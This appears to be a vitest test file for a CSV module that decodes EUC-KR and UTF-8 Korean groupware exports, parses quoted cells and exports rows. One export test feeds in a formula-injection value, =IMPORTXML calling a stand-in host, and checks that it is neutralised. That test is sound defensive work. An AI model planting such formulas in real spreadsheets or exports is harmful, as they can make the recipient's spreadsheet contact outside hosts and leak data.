import { describe, expect, it } from "vitest";

import { decodeCsvSource, formatCsvRows, parseCsvRows } from "./sourceText";

describe("source text decoding", () => {
  it("decodes CP949/EUC-KR Korean groupware CSV without mojibake", () => {
    const cp949GroupwareCsv = Uint8Array.from([
      192, 204, 184, 167, 44, 187, 231, 185, 248, 44, 193, 247, 192, 167, 44,
      200, 184, 187, 231, 184, 237, 44, 186, 206, 188, 173, 184, 237, 13, 10,
      176, 237, 185, 206, 188, 173, 44, 44, 180, 235, 199, 165, 44, 177, 215,
      183, 236, 187, 231, 44, 176, 230, 191, 181, 193, 246, 191, 248, 13, 10,
    ]);

    const parsed = decodeCsvSource(cp949GroupwareCsv);

    expect(parsed.decoded.encoding).toBe("euc-kr");
    expect(parsed.decoded.text).toContain("이름,사번,직위,회사명,부서명");
    expect(parsed.rows[1]).toEqual(["고민서", "", "대표", "그룹사", "경영지원"]);
    expect(parsed.decoded.text).not.toContain("�");
  });

  it("decodes UTF-8 with BOM and preserves Hangul headers", () => {
    const utf8WithBom = Uint8Array.from([
      0xef,
      0xbb,
      0xbf,
      ...new TextEncoder().encode("이름,회사명\r\n개발자,그룹사\r\n"),
    ]);

    const parsed = decodeCsvSource(utf8WithBom);

    expect(parsed.decoded.encoding).toBe("utf-8-bom");
    expect(parsed.rows[0]).toEqual(["이름", "회사명"]);
    expect(parsed.rows[1]).toEqual(["개발자", "그룹사"]);
  });
});

describe("CSV parsing", () => {
  it("preserves commas, quotes, newlines, and empty cells for mapping preview", () => {
    expect(parseCsvRows('이름,메모,부서\r\n"김,테스트","줄1\n줄2",""\r\n')).toEqual([
      ["이름", "메모", "부서"],
      ["김,테스트", "줄1\n줄2", ""],
    ]);
  });
});

describe("CSV export", () => {
  it("outputs standardized CRLF CSV and neutralizes spreadsheet formulas", () => {
    expect(
      formatCsvRows([
        ["성명", "메모", "계좌/계좌번호"],
        ["개발자", "쉼표, 따옴표 \" 포함", "=IMPORTXML(\"https://bad.example\")"],
      ]),
    ).toBe(
      '성명,메모,계좌/계좌번호\r\n개발자,"쉼표, 따옴표 "" 포함","\'=IMPORTXML(""https://bad.example"")"',
    );
  });
});
